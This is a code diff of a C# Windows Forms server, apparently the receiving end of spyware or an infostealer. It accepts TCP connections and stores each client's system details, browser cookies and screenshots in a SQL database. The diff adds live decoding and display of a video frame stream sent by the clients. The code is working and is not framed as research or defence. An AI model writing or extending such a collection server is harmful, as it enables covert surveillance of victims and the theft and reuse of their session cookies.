@@ -1,10 +1,9 @@
 ﻿using System;
 using System.Data.SqlClient;
+using System.Drawing;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -17,13 +16,12 @@ namespace ServerTest
 
         private bool isRunning;
         private TextBox infoTextBox;
+        private Outils outilsControl;
 
         private SqlConnection cnx;
         private string currentTime;
 
-        private VideoServer videoServer;
-
-        public Server(int port, int videoPort, TextBox textBox)
+        public Server(int port, int videoPort, TextBox textBox, Outils outilsControl)
         {
             textSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             IPEndPoint iep = new IPEndPoint(IPAddress.Parse("0.0.0.0"), port);
@@ -35,9 +33,7 @@ namespace ServerTest
 
             isRunning = false;
             infoTextBox = textBox;
-
-            // Initialiser le serveur vidéo
-            videoServer = new VideoServer();
+            this.outilsControl = outilsControl;
         }
 
         public void Start()
@@ -47,21 +43,17 @@ namespace ServerTest
             videoSocket.Listen(5);
             AddTextToInfoTextBox("Serveur démarré. En attente de connexions...");
 
-            Task.Run(() => videoServer.StartServerAsync(80));
-
-            Task.Run(() => AcceptTextClients()); // Démarrer la méthode AcceptClients dans un nouveau thread
+            Task.Run(() => AcceptTextClients());
             Task.Run(() => AcceptVideoClients());
             AddTextToInfoTextBox("Client Connected...");
         }
 
         private void AcceptTextClients()
         {
-
             while (isRunning)
             {
                 Socket clientSocket = textSocket.Accept();
-                Task.Run(() => Communication(clientSocket)); // Utilisation de Task.Run pour éviter le blocage de l'interface
-
+                Task.Run(() => Communication(clientSocket));
             }
         }
 
@@ -84,7 +76,6 @@ namespace ServerTest
             {
                 while (true)
                 {
-                    // Lire les données envoyées par le client
                     string os = reader.ReadLine();
                     string motherboard = reader.ReadLine();
                     string processor = reader.ReadLine();
@@ -92,16 +83,13 @@ namespace ServerTest
                     string disk = reader.ReadLine();
                     string cookies = reader.ReadLine();
 
-                    // Lire la capture d'écran envoyée par le client
                     string screenshotBase64 = reader.ReadLine();
                     byte[] screenshot = Convert.FromBase64String(screenshotBase64);
 
-                    // Stocker les données dans la base de données
                     InsertDataIntoDatabase(os, motherboard, processor, ram, disk, screenshot, cookies);
                     i++;
                     currentTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                    AddTextToInfoTextBox(" Les Données "+ i + " reçues et stockées dans la base de données a " + currentTime);
-                    //MessageBox.Show("Données reçues et stockées dans la base de données.");
+                    AddTextToInfoTextBox("Les Données " + i + " reçues et stockées dans la base de données à " + currentTime);
                 }
             }
             catch (Exception ex)
@@ -122,11 +110,35 @@ namespace ServerTest
 
             try
             {
-                byte[] videoBuffer = ReadVideoStream(ns);
+                while (isRunning)
+                {
+                    byte[] lengthBuffer = new byte[4];
+                    int bytesRead = ns.Read(lengthBuffer, 0, lengthBuffer.Length);
+                    if (bytesRead == 0) break;
 
-                // Traiter la vidéo ici
+                    int frameLength = BitConverter.ToInt32(lengthBuffer, 0);
+                    //AddTextToInfoTextBox($"Frame length: {frameLength}");
+                    byte[] frameBuffer = new byte[frameLength];
 
-                AddTextToInfoTextBox("Vidéo reçue et traitée avec succès");
+                    int totalBytesRead = 0;
+                    while (totalBytesRead < frameLength)
+                    {
+                        bytesRead = ns.Read(frameBuffer, totalBytesRead, frameLength - totalBytesRead);
+                        if (bytesRead == 0) break;
+                        totalBytesRead += bytesRead;
+                    }
+
+                    //AddTextToInfoTextBox($"Total bytes read: {totalBytesRead}");
+
+                    if (totalBytesRead == frameLength)
+                    {
+                        using (MemoryStream ms = new MemoryStream(frameBuffer))
+                        {
+                            Bitmap bitmap = new Bitmap(ms);
+                            DisplayFrame(bitmap);
+                        }
+                    }
+                }
             }
             catch (Exception ex)
             {
@@ -139,26 +151,26 @@ namespace ServerTest
             }
         }
 
-        private byte[] ReadVideoStream(NetworkStream ns)
+        private void DisplayFrame(Bitmap bitmap)
         {
-            using (MemoryStream ms = new MemoryStream())
+            if (outilsControl.VideoPictureBox.InvokeRequired)
             {
-                byte[] buffer = new byte[1024];
-                int bytesRead;
-                while ((bytesRead = ns.Read(buffer, 0, buffer.Length)) > 0)
+                outilsControl.VideoPictureBox.Invoke(new Action(() => DisplayFrame(bitmap)));
+            }
+            else
+            {
+                if (outilsControl.VideoPictureBox.Image != null)
                 {
-                    ms.Write(buffer, 0, bytesRead);
+                    outilsControl.VideoPictureBox.Image.Dispose();
                 }
-                return ms.ToArray();
+                outilsControl.VideoPictureBox.Image = bitmap;
             }
         }
 
-
         private void InsertDataIntoDatabase(string os, string motherboard, string processor, string ram, string disk, byte[] screenshot, string cookies)
         {
-            // Connexion à la base de données et insertion des données
-            string query = "INSERT INTO receivedData1 (OS, motherboard, processeur, ram, hardDisk, captureData,cookies, receivedAt) " +
-                           "VALUES (@OS, @Motherboard, @Processor, @RAM, @Disk, @Screenshot,@cookies, @ReceivedAt)";
+            string query = "INSERT INTO receivedData1 (OS, motherboard, processeur, ram, hardDisk, captureData, cookies, receivedAt) " +
+                           "VALUES (@OS, @Motherboard, @Processor, @RAM, @Disk, @Screenshot, @cookies, @ReceivedAt)";
 
             using (SqlConnection cnx = Program.GetSqlConnection())
             {
@@ -171,7 +183,7 @@ namespace ServerTest
                     command.Parameters.AddWithValue("@Disk", disk);
                     command.Parameters.AddWithValue("@Screenshot", screenshot);
                     command.Parameters.AddWithValue("@cookies", cookies);
-                    command.Parameters.AddWithValue("@ReceivedAt", DateTime.Now); // Utilisation de la date et l'heure actuelles
+                    command.Parameters.AddWithValue("@ReceivedAt", DateTime.Now);
 
                     cnx.Open();
                     command.ExecuteNonQuery();
@@ -179,19 +191,14 @@ namespace ServerTest
             }
         }
 
-
-        // Méthode pour ajouter du texte à la TextBox infoTextBox
         private void AddTextToInfoTextBox(string text)
         {
-            // Vérifier si l'appel provient d'un thread différent
             if (infoTextBox.InvokeRequired)
             {
-                // Exécuter le code dans le thread approprié en utilisant Invoke
                 infoTextBox.Invoke(new MethodInvoker(() => AddTextToInfoTextBox(text)));
             }
             else
             {
-                // Ajouter le texte à la TextBox infoTextBox
                 infoTextBox.AppendText(text + Environment.NewLine);
             }
         }
@@ -200,6 +207,7 @@ namespace ServerTest
         {
             isRunning = false;
             textSocket.Close();
+            videoSocket.Close();
             AddTextToInfoTextBox("Fermeture de la connexion");
         }
     }
